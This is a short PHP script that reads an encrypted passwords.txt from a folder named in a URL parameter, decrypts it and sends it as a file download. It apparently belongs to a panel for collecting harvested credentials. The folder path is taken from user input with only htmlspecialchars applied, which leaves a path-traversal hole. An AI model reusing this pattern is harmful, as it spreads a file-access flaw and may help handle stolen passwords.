<?php
    include 'includes/functions.php';
    include_once 'includes/checks.php';
     
    if(isset($_GET['getPasswords'])){
        $file = htmlspecialchars($_GET['getPasswords']) . '/passwords.txt';
        $file1 = htmlspecialchars($_GET['getPasswords']) . '/decrypted.txt';
        $folder = htmlspecialchars($_GET['getPasswords']);
        if(file_exists($file)){

            $decrypt=file_get_contents("$file");
            $decrypt=str_replace($decrypt, decrypt($decrypt), $decrypt);
            file_put_contents("$file1", $decrypt);
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file1));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file1));
            readfile($file1);
            unlink($file1);
            die();
        }
    }
?>